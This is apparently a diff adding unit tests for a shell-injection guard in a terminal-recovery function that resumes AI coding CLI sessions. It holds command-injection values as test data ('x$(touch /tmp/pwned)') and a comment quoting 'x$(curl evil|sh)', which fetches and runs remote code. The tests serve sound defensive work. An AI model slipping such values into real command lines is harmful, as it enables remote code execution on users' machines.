@@ -110,6 +110,42 @@ describe('resolveRecoveryCommand', () => {
     );
   });
 
+  it('prefers --resume <stored cli_session_id> over the base name when captured', () => {
+    // Session capture (2026-06-10): /api/cli-hook persisted the CLI's real
+    // session UUID at SessionStart — resume-by-id always resolves, while
+    // resume-by-name only works when the CLI session is named after the
+    // terminal.
+    createTerminalRecord({
+      sessionId: 't_cli_sess',
+      name: 'speedyClaude',
+      agentKind: 'claude_code',
+      bootCommand: 'claude --remote-control',
+      cliSessionId: 'b6e2f1a0-1234-4cde-9f00-abcdef012345',
+      cliSessionSource: 'claude-code'
+    });
+    const rec = getTerminalRecord('t_cli_sess')!;
+    expect(resolveRecoveryCommand(rec, { resume: true })).toBe(
+      'claude --remote-control --resume "b6e2f1a0-1234-4cde-9f00-abcdef012345"'
+    );
+  });
+
+  it('falls back to the base name when the stored cli_session_id is not shell-inert', () => {
+    // A poisoned cli_session_id must not reach the typed line — the same
+    // allowlist guards every resume target; the safe name is the fallback.
+    createTerminalRecord({
+      sessionId: 't_cli_sess_evil',
+      name: 'speedyClaude',
+      agentKind: 'claude_code',
+      bootCommand: 'claude --remote-control',
+      cliSessionId: 'x$(touch /tmp/pwned)',
+      cliSessionSource: 'claude-code'
+    });
+    const rec = getTerminalRecord('t_cli_sess_evil')!;
+    expect(resolveRecoveryCommand(rec, { resume: true })).toBe(
+      'claude --remote-control --resume "speedyClaude"'
+    );
+  });
+
   it('does NOT append --resume when the name carries shell metacharacters (RCE guard)', () => {
     // The command is typed into the pane shell, so a name like `x$(curl evil|sh)`
     // would execute on recovery if it reached the line. The allowlist rejects it
